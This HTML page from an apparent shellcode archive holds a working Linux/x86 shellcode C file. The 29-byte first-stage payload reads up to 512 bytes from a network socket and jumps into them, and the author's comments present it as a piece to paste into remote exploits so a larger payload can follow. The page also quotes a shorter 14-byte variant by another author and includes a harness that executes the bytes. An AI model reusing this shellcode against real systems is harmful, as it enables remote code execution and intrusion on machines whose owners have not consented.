<html><head><title>Linux/x86 - if(read(fd,buf,512)&lt;=2) _exit(1) else buf(); - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* h3ll-core.c by Charles Stevenson &lt;core@bokeoa.com&gt; 
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it as a first stage payload when I desire to
 * follow up with a real large payload of goodness.  This actually
 * is a bit larger than necessary because of the error checking but
 * in some cases prooves nice.  For a tiny version of the same theme
 * check out mcb's 14 byte (saving of 15 bytes for all you
 * mathematician's out there ;).  The only problem might be that his
 * reads from stdin and can only reads 385 bytes less than mine.  So
 * If you like to go big on the shellcode use mine... otherwise here's
 * mcb's (or comment out the delimited lines below to shrink mine):
 *
 * &quot;\x6a\x03\x58\x31\xdb\x6a\x7f\x5a\x89\xe1\xcd\x80\xff\xe4&quot;
 *
 * I assume the file descriptor is in %esi.  Since that's where it
 * was on the last exploit I wrote.  Change the instruction to
 * the appropriate register from your fndsckcode or put an int in
 * there for and fd that's always the same.
 */
char hellcode[] = /* if(read(fd,buf,512)&lt;=2) _exit(1) else buf(); linux/x86 by core */
//  uncomment the following line to raise SIGTRAP in gdb
// &quot;\xcc&quot;                    // int3
//  22 bytes:
//  if (read(fd,buf,512) &lt;= 0x2) _exit(1) else buf();
&quot;\x31\xdb&quot;                  // xor    %ebx,%ebx
&quot;\xf7\xe3&quot;                  // mul    %ebx
&quot;\x42&quot;                      // inc    %edx
&quot;\xc1\xe2\x09&quot;              // shl    $0x9,%edx
&quot;\x31\xf3&quot;                  // xor    %esi,%ebx // (optional assumes fd in esi)
&quot;\x04\x03&quot;                  // add    $0x3,%al
&quot;\x54&quot;                      // push   %esp
&quot;\x59&quot;                      // pop    %ecx
&quot;\xcd\x80&quot;                  // int    $0x80
&quot;\x3c\x02&quot;                  // cmp    $0x02,%al // (optional error check) 
&quot;\x7e\x02&quot;                  // jle    exit      // (optional exit clean) 
&quot;\xff\xe1&quot;                  // jmp    *%ecx
//  7 bytes _exit(1) (optional _exit(1);)
&quot;\x31\xc0&quot;                  // xor    %eax,%eax
&quot;\x40&quot;                      // inc    %eax
&quot;\x89\xc3&quot;                  // mov    %eax,%ebx
&quot;\xcd\x80&quot;                  // int    $0x80
;

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte if(read(fd,buf,512)&lt;=2) _exit(1) else buf(); linux/x86 by core\n\tNOTE: w/optional 11 bytes check and exit (recommend unless no room)\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
